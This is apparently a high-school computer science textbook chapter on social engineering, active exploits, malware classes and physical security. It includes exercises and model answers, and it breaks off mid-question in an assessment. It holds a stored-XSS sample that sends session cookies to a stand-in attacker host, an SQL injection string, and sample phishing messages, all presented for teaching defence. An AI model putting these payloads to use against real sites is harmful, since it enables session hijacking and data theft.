# Unit 2 — Chapter 11: Cyber Threats & Malware

This chapter expands on the fundamental cybersecurity concepts introduced in Chapter 10, moving into the technical analysis of active security threats, system exploits, malware classifications, and physical boundary vulnerabilities. 

As a software developer or network administrator under the **Western Australian SCSA Computer Science ATAR curriculum**, you must be able to distinguish between different compromise methods, evaluate physical security threats, and design active defenses to safeguard users and databases from malicious exploitation.

Throughout this chapter, we will continue applying these concepts to our recurring **WA Junior Sports Carnival** scenario, exploring how real-world timing systems, public scoreboards, and administrative databases are compromised and defended.

---

## Lesson 11.1: Social Engineering & Phishing

### Your Goal
Identify, analyze, and construct defensive training models against social engineering, phishing vectors, and IP spoofing tactics.

### Before You Start
Ensure you are comfortable with:
*   [Lesson 10.2: Privacy Act 1988 & Australian Privacy Principles (APPs)](./year-11-textbook-chapter-10.md#lesson-102-privacy-act-1988--australian-privacy-principles-apps).
*   [Lesson 10.4: The AAA Security Framework](./year-11-textbook-chapter-10.md#lesson-104-the-aaa-security-framework).

### The Idea
Most security systems are protected by robust cryptographic algorithms, complex firewalls, and strict database access controls. However, the most vulnerable component of any secure system is not the software or hardware—it is the **human user**.

**The Analogy:**
Imagine a multi-million dollar bank vault with reinforced steel doors, biometric locks, and motion detectors. 
*   A burglar attempts to blow up the doors or crack the biometric scanner, but fails repeatedly because the technical controls are too strong.
*   Instead of attacking the vault directly, the burglar calls the bank manager. Pretending to be an official fire inspector, they tell the manager there is an urgent electrical emergency in the basement and ask the manager to remotely disable the security locks to "save the building from burning down." 
*   The manager, acting out of panic and wanting to help, disables the locks and opens the doors. The burglar walks in and takes the cash.

This is the essence of **Social Engineering**: manipulating individuals into performing actions or divulging confidential information (like passwords or sensitive registration data) by exploiting human psychology (such as fear, trust, urgency, or helpfulness).

#### **SCSA Key Terms**
*   **Social Engineering:** The broad practice of manipulating people into giving up confidential information or bypassing security controls.
*   **Phishing:** A form of social engineering where attackers send fraudulent communications (usually emails) disguised as trustworthy entities to steal credentials or install malware.
*   **Spear-Phishing:** A highly targeted phishing attack customized for a specific individual, organization, or school, using personal details to build trust.
*   **Whaling:** A specialized spear-phishing attack directed at high-profile executives, such as a school principal or a sports association CEO.
*   **IP Spoofing:** A technical compromise method where an attacker alters the source IP address in a packet header to mimic a trusted internal device, bypassing IP-based firewall filters.

---

### See It Worked
#### **The Scenario**
During the busiest week of the **WA Junior Sports Carnival**, the registration desk registrar receives an email that appears to come from the main bank portal used to process team fees.

Let's deconstruct this malicious email to spot the technical and psychological compromise indicators:

```
From: WA Sports Carnival Finance <support@secures-wasportscarnival.com>
To: registrar@wasportscarnival.wa.edu.au
Subject: URGENT: Complete APP 11 Security Audit or Sports Carnival Suspension!

Dear Registrar,

We have detected unauthorized login attempts on your WA Junior Sports Carnival
coordinator database. To prevent full database locking and protect student names
under the Privacy Act 1988, you must immediately verify your administrator login 
credentials.

Failure to verify within 24 hours will result in the suspension of your school's
participation in the upcoming regional athletics finals.

Click here to verify your account and secure your data:
http://login.secures-wasportscarnival.com/portal/admin-auth/login.html

Regards,
WA Junior Sports Carnival Finance Committee
```

#### **How the Logic Flows**
To analyze and defend against this threat, we break the email down into its specific social engineering and technical markers:
1.  **Psychological Exploit (Urgency and Fear):** The subject line uses the words `"URGENT"` and threatens `"Sports Carnival Suspension"`. Attackers use fear to bypass logical checking, hoping the registrar will panic and click the link without inspecting the sender details.
2.  **Use of Legitimate Context:** The email references the `"Privacy Act 1988"` and `"APP 11"` to sound official and legally binding.
3.  **Spoofed Domain Name / Lookalike URL:** The sender's domain is `support@secures-wasportscarnival.com` and the hyperlink points to `login.secures-wasportscarnival.com`. 
    *   *The analysis:* The official website of the event is `wasportscarnival.wa.edu.au`. The attacker has registered a lookalike commercial domain (`.com`) containing the words "secures" and "wasportscarnival" to deceive the eye.
4.  **Generic Greeting:** The email begins with `"Dear Registrar"` instead of using the registrar's actual name, which is a common sign of automated phishing templates.
5.  **Technical Defense:** An administrator trained in phishing detection will not click the link. They will inspect the email headers, identify the domain misalignment, and report the message to the IT department to block the domain at the firewall level.

---

### Try It with Help
#### **The Problem**
The head coordinator of the **WA Junior Sports Carnival** receives a phone call from an individual claiming to be a technician from the WA Education Department's central IT support desk. 
*   The caller states: *"We are running an active system update on ovals connected to your local school node. To make sure your ovals don't lose internet during tomorrow's events, I need you to confirm your administrator username, password, and the serial number of your central network router."*
*   The caller sounds highly professional and mentions several local WA school names to prove their identity.

Build a structured organizational checklist that the coordinator should execute *before* sharing any system credentials.

#### **Structural Hints**
1.  **Authentication Challenge:** Never accept identity claims on inbound calls. How can the coordinator independently authenticate the caller's identity?
2.  **Principle of Least Privilege:** Does a central IT technician ever legitimately require a user's password or physical router coordinates over the phone?
3.  **Callback Verification:** Detail the step-by-step procedure to terminate the call and verify through official channels.

#### **Scaffolded Student Guide**
*   **Step 1 (Immediate Hold):** Polite refusal to share any password. Under organizational policies, passwords are *never* shared over the phone.
*   **Step 2 (Callback Verification):** Hang up the phone. Locate the official, publicly listed telephone number of the Education Department IT Desk, and call them directly to verify if an active update or ticket exists.
*   **Step 3 (Incident Logging):** If the Department has no record of the caller, write a report detailing the caller's incoming number and the questions they asked, and forward it to the network administrator.

---

### Try It Yourself
#### **The Problem**
A school administrative registrar was busy processing late-entry athlete details on a tablet computer at the track-side desk. They received a text message that appeared to be from their telecommunications provider:
```
ALERT: Your sports-tablet mobile data plan has exceeded its 10GB limit. 
To avoid immediate network disconnection at the sports oval, update 
your credit card billing details here: https://wa-telecom-billing.net/data-limit
```
Because they were overwhelmed with ovals scheduling, they clicked the link, which loaded a clean, professional web page displaying the provider's logo, and entered their login credentials and credit card information. Two hours later, they noticed unauthorized banking transactions.

Write an analysis of this security incident (approx. 150 words). In your answer:
1.  Identify the specific category of social engineering attack used.
2.  Explain why the registrar was vulnerable in that moment.
3.  Recommend **two** organizational policies that would prevent this compromise in the future.

---

### Check Your Reasoning
#### **The Answer**
An expert response must address the following elements:
1.  **Attack Classification:** This is a **phishing attack** (specifically **SMiShing**—SMS-based phishing). The domain `wa-telecom-billing.net` is a spoofed domain disguised to look like a legitimate telecom utility.
2.  **Human Vulnerability Factors:**
    *   **Contextual Pressure / Stress:** The registrar was working active track-side desks under high pressure with immediate deadlines.
    *   **Fear of Service Disruption:** The threat of losing mobile internet access directly at the sports field created urgency, forcing them to bypass normal verification.
3.  **Recommended Defensive Policies:**
    *   **Mandatory Multi-Factor Authentication (MFA):** Enforce MFA across all administrative accounts. Even if the attacker steals the username and password via the phishing page, they cannot access the system without the temporary MFA code.
    *   **Incident Reporting and Verification Workflows:** Implement a policy requiring all urgent billing alerts to be accessed and updated *only* by logging directly into the official portal app or URL, rather than clicking link paths embedded in text messages or emails.

#### **Common SCSA Student Errors**
*   **Calling it "IP Spoofing":** Many students confuse social engineering spoofing with IP Spoofing. IP spoofing is a purely technical packet manipulation at the Internet layer to fool routers; it has nothing to do with fake websites or text messages targeting human eyes.
*   **Blaming the technical firewall:** Blaming the network firewall for failing to stop the text. Firewalls protect network boundaries, but cannot stop direct SMS messages received on personal or school-issued SIM card cellular links.

---

### Review and Connect
In this lesson, you learned that social engineering targets human trust and stress to bypass security. In the next lesson, we will analyze **active system exploits**—where attackers bypass human elements and deploy technical code vectors directly against software databases and network nodes.

---

## Lesson 11.2: Active System Exploits

### Your Goal
Diagram, explain, and design active defenses against injection (SQLi), interceptive (MitM), structural (Back doors), and delivery (XSS, DoS) exploits.

### Before You Start
Ensure you are comfortable with:
*   [Lesson 5.2: Relational Operators](./year-11-textbook-chapter-5.md#lesson-52-relational-operators) (understanding Boolean evaluation lines).
*   [Lesson 9.1: DoD TCP/IP Model and Protocols](./year-11-textbook-chapter-9.md#lesson-91-dod-tcpip-model-and-protocols) (routing packets and protocol flows).

### The Idea
When human boundaries cannot be manipulated, attackers attempt to exploit structural weaknesses in code, unvalidated user input boxes, and network transmission pathways. 

These technical actions are known as **Active System Exploits**. We categorize them by their behaviors and target environments:

```
                          [ ACTIVE EXPLOITS ]
                                   |
         +-------------------------+-------------------------+
         |                                                   |
  [ DATA & CODE LEVEL ]                             [ NETWORK & LINK LEVEL ]
  - SQL Injection (SQLi)                            - Denial of Service (DoS/DDoS)
    (Inject commands into inputs)                     (Flood nodes with packets)
  - Cross-Site Scripting (XSS)                      - Man-in-the-Middle (MitM)
    (Inject scripts into browsers)                    (Intercept active packet routes)
  - Back Doors                                      - IP Spoofing
    (Undetected custom access points)                 (Fake packet source headers)
```

#### **SCSA Key Terms**
*   **SQL Injection (SQLi):** An exploit where an attacker inputs malicious SQL statements into web entry forms, tricking the backend database into executing unauthorized database commands.
*   **Cross-Site Scripting (XSS):** An exploit where malicious scripts are injected into trusted web applications, which are then delivered and executed in other users' browsers.
*   **Denial of Service (DoS):** An attack designed to render a network resource or server unavailable to its intended users by flooding it with excess broadcast traffic or requests.
*   **Distributed Denial of Service (DDoS):** A DoS attack initiated from multiple distributed host nodes (often botnets) simultaneously, making it incredibly difficult to block at the firewall.
*   **Man-in-the-Middle (MitM):** An active interception attack where an unauthorized node sits in the active data path between two communicating devices, copying, reading, or modifying packets in transit.
*   **Back door:** A physical or structural entry method embedded in software or hardware that bypasses normal security authentication, leaving an undetected entrance for persistent access.

---

### See It Worked
#### **The Scenario**
The developer of the public WA Junior Sports Carnival leaderboard portal writes a basic SQL query to let parents search for an athlete by their surname.

Here is the vulnerable backend code written by the student:
```sql
-- Vulnerable search query construction
SELECT * FROM Athletes WHERE Surname = 'INPUT_BOX_VALUE';
```

If a parent searches for the surname `"Smith"`, the query executes safely as:
`SELECT * FROM Athletes WHERE Surname = 'Smith';`

However, an attacker inputs the following string into the surname search box:
`' OR '1'='1`

Let's see how the database evaluates this input:

```sql
-- The resulting SQL injection execution
SELECT * FROM Athletes WHERE Surname = '' OR '1'='1';
```

#### **How the Logic Flows**
1.  **Breaking the Syntax:** The single quote (`'`) in the attacker's input immediately closes the string parameter for `Surname = ''`.
2.  **Injecting the Condition:** The injected code adds an `OR` comparison operator followed by a statement that is always true (`'1'='1'`).
3.  **Bypassing the Search Filter:** Because `1=1` is always `True`, the entire compound Boolean expression in the `WHERE` clause evaluates to `True` for *every single row* in the database table, regardless of the surname.
4.  **The Payload Outcome:** The database returns *every record* in the Athletes table to the screen, exposing sensitive personal data (PII) including email addresses and dates of birth, directly violating Australian Privacy Principle 11.

#### **The Technical Defense: Parameterized Queries**
To defend against SQL Injection, developers must **never concatenate user inputs directly into SQL commands**. Instead, they use parameterized queries (prepared statements):

```python
# Secure Python implementation using parameterized input bindings
import sqlite3
connection = sqlite3.connect("carnival.db")
cursor = connection.cursor()

user_input = "' OR '1'='1"

# The database treats the input strictly as a text string literal, NOT executable SQL
query = "SELECT * FROM Athletes WHERE Surname = ?"
cursor.execute(query, (user_input,))
```
By using the placeholder `?`, the database engine treats the input strictly as a literal search string value. It looks for an athlete whose physical surname is exactly `"' OR '1'='1"`, resulting in a safe, empty query return.

---

### Try It with Help
#### **The Problem**
A parent at the athletics oval attempts to view live carnival results by connecting their smartphone to a free, unsecured wireless network named *"WA_Carnival_Public_Wi-Fi"*. 
*   An attacker sitting in the spectator stands has set up a rogue wireless access point (WAP) with the exact same SSID name using a stronger transmitter.
*   The parent's device automatically connects to the attacker's rogue WAP instead of the official school node.
*   The attacker forwards the parent's requests to the real web server, but intercepts and logs all HTTP packets, capturing the parent's administrative password in plaintext.

Draw and label a network data-path diagram showing this Man-in-the-Middle (MitM) exploit, and identify **two** protocols or network architectures that would neutralize this attack.

#### **Structural Hints**
1.  **Diagram Layout:** Place three nodes in a linear sequence: **Parent's Device** $ightarrow$ **Attacker's Rogue WAP** $ightarrow$ **Official Web Server**.
2.  **Packet Visibility:** Label how packets travel. Highlight that data is readable in plaintext as it passes through the Attacker's node.
3.  **Defensive Protocols:** Review your network protocols from Lesson 9.1. Which protocols encrypt Application layer data so that even if packet paths are intercepted, the content remains unreadable cipher text?

#### **Scaffolded Student Guide**
*   **Drawing the Flow:**
    `[Parent Device]  ======= (Plaintext HTTP Packets) ======>  [Rogue WAP (Attacker)]  =======>  [Official Server]`
*   **Mitigation 1 (Application Layer Encryption):** Mandate **HTTPS** (HTTP Secure) using SSL/TLS. HTTPS encrypts packets at the transport boundary, ensuring that an intercepting attacker only sees encrypted bytes, not passwords.
*   **Mitigation 2 (Secure Network Routing):** Establish a Virtual Private Network (**VPN**) tunnel or configure the official network with WPA3 authentication to protect the link.

---

### Try It Yourself
#### **The Problem**
A high-school student running a private web server discovers that a malicious user has submitted the following script block into the "Public Support Comments" form field on their guestbook web app:
```html
<script>
  fetch('http://attacker-server.com/log?cookie=' + document.cookie);
</script>
```
Whenever any other user visits the guestbook page, their web browser automatically loads and executes this script, sending their private session cookies directly to the attacker's server.

Write a technical analysis report (approx. 200 words) addressing the following:
1.  Identify the category of active system exploit being executed.
2.  Explain the difference between this exploit and an SQL injection.
3.  Detail **two** distinct developer techniques to protect a web application from this script vulnerability.

---

### Check Your Reasoning
#### **The Answer**
An expert response must highlight:
1.  **Exploit Classification:** This is a **Cross-Site Scripting (XSS)** attack (specifically, **Stored XSS**). The malicious script is permanently stored on the web server's database and executed in the browsers of visiting users.
2.  **Structural Contrast with SQLi:**
    *   **Target of SQLi:** SQL injection targets the **backend SQL database engine**. The malicious code is executed on the server database level to manipulate records or bypass login checks.
    *   **Target of XSS:** XSS targets the **frontend user's browser**. The malicious payload (usually JavaScript) is stored on the server but is ultimately executed on the *client's* device to steal session credentials, hijack accounts, or redirect page visits.
3.  **Developer Mitigation Strategies:**
    *   **Input Sanitization & Output Encoding:** Sanitize user inputs to strip out characters like `<` and `>` (converting them to HTML entities like `&lt;` and `&gt;`). This makes the browser render the script block as plain text rather than executing it as active code.
    *   **Content Security Policy (CSP):** Implement a strict CSP HTTP header that restricts where scripts can be loaded from, blocking unauthorized external fetch requests to domains like `attacker-server.com`.

#### **Common SCSA Student Errors**
*   **Mixing up SQLi and XSS targets:** Claiming that XSS injects scripts into the database to corrupt SQL tables. XSS *uses* the database as a storage vessel, but the code executes entirely in the client's web browser, not the database engine.
*   **Relying on Firewalls:** Believing a standard network-layer firewall can block XSS or SQLi. Because these attacks travel over legitimate port 80/443 web traffic, standard firewalls cannot identify the malicious payloads inside the application data. Web Application Firewalls (WAF) or secure coding standards are required.

---

### Review and Connect
In this lesson, you analyzed how software vulnerabilities are actively exploited using injection and network interception. In the next lesson, we will transition into **malware classification**—exploring the different types of malicious software payloads that infect physical host machines.

---

## Lesson 11.3: Malware Classification

### Your Goal
Classify and distinguish between types of malware (viruses, worms, Trojan horses, spyware, adware, ransomware) based on their execution, replication, and payload delivery behaviors.

### Before You Start
Ensure you are comfortable with:
*   [Lesson 10.3: The CIA Triad of Security Analysis](./year-11-textbook-chapter-10.md#lesson-103-the-cia-triad-of-security-analysis) (specifically Availability and Confidentiality risks).

### The Idea
Malicious software, or **malware**, is any program code written with the intent to damage, disrupt, or gain unauthorized access to computer systems and networks. 

To analyze and defend against malware in SCSA examinations, you must categorize them not just by their names, but by how they **replicate (spread)**, how they are **executed**, and the **damage (payload)** they deliver.

**The Analogy:**
Imagine physical health threats:
*   **A Biological Virus:** Cannot spread on its own. It requires a human to touch an infected door handle and then touch their eyes (requires host action to activate and replicate).
*   **An Airborne Bacteria / Worm:** Spreads automatically through air conditioning ducts. It doesn't need humans to do anything; it replicates and moves through corridors by itself (network replication).
*   **A Trojan Horse:** A bottle of medicine delivered to your room labeled "Vitamin C" that actually contains a sleeping draft (disguised as helpful utility).
*   **Ransomware:** A thief who breaks in and puts a heavy padlock on your personal desk drawers, demanding you pay them cash to hand over the key (encryption of user files).

---

#### **SCSA Malware Taxonomy Table**

| Malware Type | Primary Replication Method | Execution Trigger | Primary Operational Payload / Objective |
| :--- | :--- | :--- | :--- |
| **Virus** | Attaches code to legitimate executable files (`.exe`). | Requires **human user action** to run the host program. | Corrupts data, deletes files, or damages the operating system. |
| **Worm** | Self-replicates across **network connections** using port vulnerabilities. | Executes **automatically** without any human intervention. | Consumes network bandwidth, slows systems, and opens back doors. |
| **Trojan Horse** | Does **not self-replicate**. Must be downloaded manually by the user. | User runs the program, believing it is a **legitimate utility**. | Steals credentials, logs keystrokes, and establishes backdoor access. |
| **Spyware** | Stealth installation alongside other software. | Runs silently in the background of the OS. | Tracks user activity, logs keystrokes, and steals personal data (PII). |
| **Adware** | Bundled with free software downloads. | Runs automatically, hijacking web browsers. | Displays intrusive advertisements, pop-ups, and tracks search history. |
| **Ransomware** | Typically delivered via Trojan emails or worm vectors. | Executes and begins **systematic file encryption**. | Encrypts user documents and demands payment (ransom) for keys. |

---

### See It Worked
#### **The Scenario**
An IT audit at the **WA Junior Sports Carnival** logistics office reveals that a volunteer's laptop used to log timing results has become infected with malware. 

Let's trace how the network administrator determines the exact malware category:

```
[ VOLUNTEER ACTIONS ]
1. Volunteer downloads a free utility program: "Stopwatch-Beautifier.exe" from an untrusted site.
2. They run the program. It displays a stopwatch, but also executes hidden backend commands.

[ LOGICAL CLASSIFICATION PROCESS ]
- Did it disguise itself as a legitimate tool? Yes. -------> [ TROJAN HORSE ]
- Did it copy itself onto other network devices? No. -----> [ DOES NOT SELF-REPLICATE ]
- What did the payload do in the background? 
  * Silently recorded keyboard inputs. --------------------> [ SPYWARE / KEYLOGGER ]
  * Forwarded passwords to a remote external IP. -----------> [ APP 11 BREACH ]
```

#### **How the Logic Flows**
*   Because the malware was actively disguised as a helpful stopwatch utility to trick the volunteer into executing it, it is classified as a **Trojan Horse**.
*   Because its payload silently monitored system keystrokes to steal administrative login credentials without displaying any outward signs, it is classified as **Spyware** (specifically, a **Keylogger**).
*   This attack targeted the **Confidentiality** element of the CIA Triad.

---

### Try It with Help
#### **The Problem**
Over the weekend, the main file server hosting the **WA Junior Sports Carnival** school registrations begins running extremely slow. 
*   The network switch logs show massive traffic spikes traveling between ovals and school nodes.
*   Upon investigation, the administrator finds a small executable script in the system folder of five administrative computers. 
*   The script is actively scanning the local subnet for open port vulnerabilities (like unpatched SMB ports) and automatically copying itself to any unprotected device it finds.
*   No users have run any new files, and no emails were opened.

Classify this malware type, identify which element of the CIA Triad is compromised, and suggest the primary network defensive action.

#### **Structural Hints**
1.  **Analyze Replication:** Did this malware require a human user to double-click a file or download an email attachment to spread to the other five computers?
2.  **Analyze Traffic Impact:** How does self-replication impact the local network capacity?
3.  **Select the Category:** Review the taxonomy table. Which category is defined by network-based, automated self-replication?

#### **Scaffolded Student Guide**
*   **Replication Check:** The malware spreads automatically across network connections without human interaction. This behavior matches a **Worm**.
*   **CIA Triad Impact:** By consuming network bandwidth and slowing server performance, the worm primarily compromises **Availability**.
*   **Defensive Measures:** 
    *   **Isolate infected hosts:** Disconnect the five infected computers from the network immediately to halt the propagation vector.
    *   **Patch vulnerabilities:** Install security updates to close the open network ports used by the worm to spread.

---

### Try It Yourself
#### **The Problem**
A local primary school's administrative assistant opened an email attachment labeled `Invoice-SportsEquipment.pdf.exe`. Within seconds, a red screen loaded on their computer displaying a countdown timer and the message:
```
Your documents, student databases, and academic records have been encrypted 
using military-grade asymmetric cryptography. To receive the decryption key, 
you must pay 0.5 Bitcoin ($45,000 AUD) within 72 hours. 
If payment is not received, all database keys will be permanently deleted.
```
All school shared drives are now locked, and files have names ending in `.locked`.

Write an emergency incident response guide for the school's principal (approx. 200 words). In your guide:
1.  Identify the specific category of malware.
2.  Explain why paying the ransom is discouraged by Australian cybersecurity authorities.
3.  Recommend **two** technical strategies to restore school operations safely.

---

### Check Your Reasoning
#### **The Answer**
An expert response must address:
1.  **Malware Classification:** This is **Ransomware**. It was delivered via a **Trojan Horse** vector (a double-extension executable file disguised as a PDF invoice).
2.  **Ransom Non-Payment Rationale:**
    *   **No Guarantee of Recovery:** Paying does not guarantee the attackers will provide the working decryption keys or delete stolen personal data.
    *   **Encourages Future Attacks:** Payment funds organized cybercrime syndicates and marks the school as a vulnerable target for future extortion.
3.  **Recovery Strategies:**
    *   **Isolate the System:** Immediately disconnect infected devices from the local school LAN to prevent the ransomware from spreading to other servers and backups.
    *   **Restore from Offline Backups:** Wipe the encrypted hard drives and restore the student databases from secure, offline (air-gapped) backups. *Note:* Online backups must not be used if they were connected during encryption, as the ransomware may have encrypted them as well.

#### **Common SCSA Student Errors**
*   **Confusing viruses and worms:** Referring to ransomware as a "network virus." Ensure you use the precise term **Ransomware** and explain how it was delivered (via Trojan vectors).
*   **Suggesting decryption by brute force:** Suggesting the school "crack the encryption key." Modern ransomware uses AES-256 or RSA-2048 encryption, which would take millions of years to brute-force; the only viable technical recovery is restoring from clean backups.

---

### Review and Connect
In this lesson, you mastered malware classifications based on replication and payload properties. In the next lesson, we will explore the final boundary of cyber security—**physical threats** and unpatched **zero-day vulnerabilities** that bypass technical boundaries entirely.

---

## Lesson 11.4: Hardware & Boundary Exploits

### Your Goal
Identify physical infrastructure security vulnerabilities and evaluate organizational strategies against physical intrusions and unpatched zero-day exploits.

### Before You Start
Ensure you are comfortable with:
*   [Lesson 9.2: Physical Media & Hardware](./year-11-textbook-chapter-9.md#lesson-92-physical-media--hardware) (understanding router, switch, and medium environments).
*   [Lesson 10.3: The CIA Triad of Security Analysis](./year-11-textbook-chapter-10.md#lesson-103-the-cia-triad-of-security-analysis).

### The Idea
You can write flawless, secure Python code and deploy robust parameterized database queries. However, if an attacker can walk into your server room, unplug your hard drives, and carry them out of the building, all of your virtual security measures are useless.

Cybersecurity requires securing both the logical code environment and the **physical boundary**.

**The Analogy:**
Imagine you live in a house with bulletproof glass windows, steel doors, and advanced biometric locks on the front door.
*   **Physical Security Failure:** You leave the side garage door wide open with a ladder leading to a second-floor window. An intruder climbs the ladder, walks into your study, and physically steals your private paper diary off your desk.
*   **Zero-Day Vulnerability:** The biometric lock manufacturer discovers a new design flaw in their locks: holding a magnetic heater against the scanner causes it to open automatically. The manufacturer has not yet updated the firmware. No one knows about this flaw except a small group of burglars who are actively using it to open houses. You have zero days to prepare a patch.

#### **SCSA Key Terms**
*   **Physical Security Threats:** Unlawful physical access, tampering, theft, or environmental damage (like fire or flood) directed at computer hardware, servers, and network cables.
*   **Zero-Day Vulnerability:** A software or hardware security flaw that is unknown to the vendor or developer, leaving "zero days" for security administrators to apply a patch before active exploitation occurs.
*   **Tailgating (Piggybacking):** A physical security compromise where an unauthorized individual closely follows an authorized employee through a secure doorway or gate without scanning their credentials.
*   **Unpatched Flaw:** A known security vulnerability for which a software patch exists, but has not yet been installed by system administrators, leaving the network vulnerable to automated exploit scripts.

---

### See It Worked
#### **The Scenario**
The WA Junior Sports Carnival administration room is set up in a temporary marquee tent near the athletics oval. The room contains the central network switch, the main database server running SQLite, and ovals registration tablets charging on desks.

An audit of this layout reveals several critical physical security threats. Let's analyze the threats and their specific SCSA mitigation strategies:

```
+-----------------------------------------------------------------------------------+
|                        [ PHYSICAL SECURITY THREAT AUDIT ]                         |
+------------------------------------+----------------------------------------------+
| Identified Vulnerability           | SCSA Mitigation Strategy                     |
+------------------------------------+----------------------------------------------+
| 1. Unlocked temporary tent walls   | Lockable, solid-walled modular server cabins|
|    allow unauthorized entry.       | on-site with active security guards.         |
+------------------------------------+----------------------------------------------+
| 2. Network switch ports are        | Disable unused physical RJ45 ports on the    |
|    exposed on open desks.          | switch; place switches in locked racks.     |
+------------------------------------+----------------------------------------------+
| 3. Volunteers tailgating through   | Mandatory sign-in registry; swipe-card access|
|    the coordinator's gate.         | with strict anti-passback turnstiles.        |
+------------------------------------+----------------------------------------------+
| 4. Server power cables running     | Uninterruptible Power Supplies (UPS) and     |
|    across high-traffic dirt ovals. | covered, heavy-duty cable tracks.            |
+------------------------------------+----------------------------------------------+
```

#### **How the Logic Flows**
*   Logical firewalls cannot prevent a spectator from physically plugging a laptop into an open ethernet port on an exposed switch to capture unencrypted data packets.
*   Physical security acts as the **outermost layer** of defense. Securing the physical hardware protects the system's **Confidentiality** (preventing theft of physical drives), **Integrity** (preventing physical swapping of drives), and **Availability** (protecting systems from power cuts or physical destruction).

---

### Try It with Help
#### **The Problem**
On Thursday afternoon, a global security alert is published detailing a critical zero-day exploit in the database library engine used by the **WA Junior Sports Carnival** leaderboard software. 
*   The software developer states that a security patch will not be released for **five days**.
*   A known exploit script has already been uploaded to public hacker forums, and automated bots are actively scanning the web to compromise vulnerable servers.

Outline the immediate emergency administrative procedures the school coordinator must execute to defend their database before the patch is released.

#### **Structural Hints**
1.  **Assess Exposure:** Is the server currently connected to the open internet? What is the risk of leaving it connected?
2.  **Mitigation without Patching:** If you cannot modify the database engine code itself, can you block access at the network boundary? (Review firewalls and IP filters from Lesson 9.2).
3.  **Temporary De-escalation:** Is it possible to run the system in a limited, offline capacity or restrict input forms?

#### **Scaffolded Student Guide**
*   **Step 1 (Immediate Boundary Defense):** Configure the network firewall to block all traffic attempting to connect to the database service ports from external, non-trusted IP addresses.
*   **Step 2 (Data Isolation):** Take the live web dashboard offline temporarily or convert the system to read-only mode, disabling user inputs to prevent the execution of malicious script payloads.
*   **Step 3 (Intrusion Detection):** Enable comprehensive server logging (Accounting under AAA) and actively monitor the logs for unusual connection patterns or crash events.

---

### Try It Yourself
#### **The Problem**
A private research facility in Western Australia is designing a secure server vault room to store highly sensitive physical drives containing medical records. The facility is vulnerable to:
*   Unauthorized tailgating by visitors through the main security door.
*   Data theft via physical USB drives inserted into local server ports.
*   Power fluctuations causing server crashes and database corruption.

Design a comprehensive physical security policy document (approx. 200 words) for the facility. Justify the inclusion of **three** distinct physical control measures, linking each measure back to the CIA Triad.

---

### Check Your Reasoning
#### **The Answer**
An expert response must propose and justify three physical controls:
1.  **Implementation of a Mantrap / Turnstile (Defends against Tailgating):**
    *   *The Control:* Install a double-door entry system (mantrap) requiring biometric verification on both doors. The second door will not unlock until the first door closes completely, allowing only one authenticated person to enter at a time.
    *   *CIA Link:* Protects **Confidentiality** by physically preventing unauthorized visitors from tailgating employees into the server vault room.
2.  **Physical Port Locks & Server Enclosures (Defends against USB tampering):**
    *   *The Control:* Encase all servers inside steel, lockable server cabinets, and install physical plastic block-outs inside unused USB and RJ45 ports.
    *   *CIA Link:* Protects **Integrity** by blocking physical tampering, preventing attackers from inserting malicious USB payloads or installing hardware backdoors.
3.  **Uninterruptible Power Supply (UPS) & Backup Generator (Defends against power loss):**
    *   *The Control:* Connect all central servers to a UPS battery array backed by an automated diesel backup generator.
    *   *CIA Link:* Protects **Availability** by maintaining constant system operations and preventing file corruption during electrical power drops.

#### **Common SCSA Student Errors**
*   **Suggesting logical solutions:** Suggesting software firewalls or password encryption. This is a *physical* security question. The prompt explicitly asks for physical control measures. Software measures are logically ineffective if the physical security boundary is breached.
*   **Vague terminology:** Writing "get locks" or "add security." Students must use precise professional terminology (e.g. *mantrap*, *biometric entry control*, *UPS*, *locked server rack*) to demonstrate curriculum competency in SCSA examinations.

---

## Teacher Support & Exam Module

### SCSA Syllabus Mappings
*   **Unit 2, Area 2.2 (Cyber Security)**: Distinguish between the different methods used to compromise the security of a system: social engineering (phishing), IP spoofing, SQL injection, denial of service, back door, man-in-the-middle, cross-site scripting.
*   **Unit 2, Area 2.3 (System Defense)**: Types of malware: viruses, worms, Trojan horses, spyware, adware, ransomware.
*   **Unit 2, Area 2.4 (Security Operations)**: Physical security threats; zero-day vulnerabilities.

### Prerequisite Diagnostic Check
Before teaching this chapter, ensure students can:
1.  Explain how client-server communication functions over TCP/IP ports 80 (HTTP) and 443 (HTTPS) from Chapter 9.
2.  Identify database entities, fields, and queries from Chapter 13.
3.  Explain the purpose of authentication and encryption from Chapter 10.

---

### Misconception Busters
1.  **"Worms and Viruses are the same thing"**:
    *   *The Reality:* A virus *attaches* itself to an existing host file and requires human action (double-clicking) to execute and propagate. A worm is a standalone file that self-replicates over network connections automatically without human action.
2.  **"Firewalls block SQL Injection"**:
    *   *The Reality:* Traditional network-layer firewalls scan packet headers (source IP, port numbers), not application payloads. Since SQL injection commands travel inside legitimate HTTP traffic (Port 80/443), they pass through standard firewalls cleanly. Preventing SQLi requires secure code practices (parameterization) or specialized Web Application Firewalls (WAF).
3.  **"Zero-day means you have zero days left to fix it"**:
    *   *The Reality:* A "zero-day" means the vulnerability was previously unknown to the vendor. The name refers to the fact that developers have had "zero days" since discovering the bug to release a patch. Once a patch is released, it is no longer a zero-day exploit (it becomes an unpatched vulnerability).

---

### WA Classroom Discussion Prompts
1.  **AI-Generated Phishing:** With the rise of large language models, scammers can generate highly sophisticated, error-free spear-phishing emails instantly. How does this impact the effectiveness of traditional phishing training that teaches users to look for "bad grammar and spelling errors"?
2.  **The Ethics of Ransom Payment:** Under Australian federal guidelines, paying ransom to cybercriminals is strongly discouraged. However, if a WA regional hospital's patient medical systems are fully locked down by ransomware, and lives are at risk, should the hospital pay the ransom? What are the legal, ethical, and practical implications?

---

### **Classroom Assessment Task**
#### **Cyber Security ATAR Unit 2 — Theory & Analysis Test**
**Time Allowed:** 25 Minutes  |  **Total Marks:** 20 Marks  |  **Calculator:** Not Permitted

---

#### **Section A: Short Answer (12 Marks)**

**Question 1 (3 Marks)**
Distinguish between **SQL Injection (SQLi)** and **Cross-Site Scripting (XSS)** based on their target system environment and their operational impact.

**Question 2 (3 Marks)**
The WA Junior Sports Carnival administration database was infected by malware. The network logs show that the malicious file copied itself automatically across the school intranet to other laptops without any volunteer clicking a link or downloading a file.
*   (a) Classify the exact type of malware. *(1 Mark)*
*   (b) Justify your classification based on its replication behavior. *(2 Marks)*

**Question 3 (3 Marks)**
Describe the security threat known as a **zero-day vulnerability**, and explain why a traditional signature-based antivirus software package is ineffective against it.

**Question 4 (3 Marks)**
